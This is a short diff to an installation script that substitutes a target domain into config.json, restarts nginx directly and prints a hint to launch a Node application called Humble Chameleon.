@@ -69,5 +69,7 @@ else
 	sed -i "s/target1.com/$target/g" ../config.json
 fi
 echo "Updated critical components in config.json. Further edits can be done in the admin console or manually."
-echo "Ensure the vhost is correct and symlinked, then run: sudo systemctl restart nginx"
+echo "Restarting nginx..."
+sudo systemctl restart nginx
+echo "Start Humble Chameleon from the parent directory with \`node index.js\`"
 echo "Thanks for playing!"
